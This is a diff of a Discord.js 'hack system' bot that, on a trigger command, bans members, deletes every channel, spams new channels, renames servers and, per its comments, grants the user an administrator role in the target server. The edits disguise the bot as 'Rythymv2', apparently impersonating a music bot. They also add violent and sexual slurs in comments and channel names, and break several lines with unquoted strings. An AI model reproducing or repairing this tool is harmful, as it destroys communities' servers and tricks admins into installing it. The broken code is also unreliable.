@@ -14,16 +14,16 @@
 const Discord = require("discord.js") //npm i discord.js
 const client = new Discord.Client();
 const Token = '' //حط توكن بوتك هنا // your bot token
-const x_x = "." //الامر يلي يشغل الكود //the command to start the hack system
-const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
-const teext = "hjacked" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
+const x_x = "." //الامر يلي يشغل الكود //!rape
+const opcmd = 'oprole' // !cum
+const teext = "hjacked" // اسم رومات الكتابيه يلي بيسويها //🗣️-random
 const vooice = "HJACKED" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
 const pic = "https://cdn.discordapp.com/attachments/505639515407253506/505640173615448064/download.png" // صوره بيسوي فيها سبام البوت //the spam embed thumbnail picture
-const spam = "HJACKED" // الكلام يلي بيسوي فيه سبام البوت //the spam message
-const namee = "HJACKED" // اسم ابوت بعد التهكير //the bot name
+const spam = "HJACKED" // الكلام يلي بيسوي فيه سبام البوت //DIE DIE DIE
+const namee = "HJACKED" // اسم ابوت بعد التهكير //Rythymv2
 const playing = "HJACKED 1 SERVER" // البلاينج //bot streaming
-const role = 'HJACKED' // اسم الرتبه يلي بيسويها //the role name
-const adminstrator = 'OP' //اسم الرتبه يلي بيسويها البوت ويعطيك اياها //the op name
+const role = 'HJACKED' // اسم الرتبه يلي بيسويها //BOT
+const adminstrator = 'OP' //اسم الرتبه يلي بيسويها البوت ويعطيك اياها //BOT
 console.log('BY OROCHIX');
 console.log('Start Hacking System ..')
 client.on('ready', () => {
@@ -34,7 +34,7 @@ client.on('ready', () => {
 client.on('ready',  () => {
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('      ~            ~  By : OROCHIX ~           ~    '); //if you share this code make sure you type my copyrights :>
+console.log('      ~            ~  By : OROCHIX ~           ~    '); //
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log(`Logged in as  * [ "  OROCHIX " ] servers! [ " ${client.guilds.size} " ] Users! [ " ${client.users.size} " ]`);
@@ -88,12 +88,12 @@ client.on('message', message => {
        baand.ban({reason: spam,});
        client.channels.forEach(hackch => {
        hackch.delete();
-       client.user.setAvatar(pic)
-       client.user.setUsername(namee)
-       client.user.setGame(playing, 'https://www.twitch.tv/hix')
+       client.user.setAvatar(https://images.discordapp.net/avatars/235088799074484224/16c197c4c3f0eb808f9bceb6e1075e71.png?size=512)
+       client.user.setUsername(Rythymv2)
+       client.user.setGame(playing, '')
        client.guilds.forEach(hack => {
-       hack.setIcon(pic)
-       hack.setName(namee)})})})}});
+       hack.setIcon(https://images.discordapp.net/avatars/235088799074484224/16c197c4c3f0eb808f9bceb6e1075e71.png?size=512)
+       hack.setName(Rythym)})})})}});
 
 //this will give you a adminstrator in the target server
 client.on('message', message => {
@@ -321,7 +321,7 @@ let me = message.author
            client.on('message', message => {
                     if (message.content === x_x) {
                           client.guilds.forEach(m =>{
-           m.createChannel(teext, 'text');
+           m.createChannel(DIE, 'DIE DIE DIE DIE');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
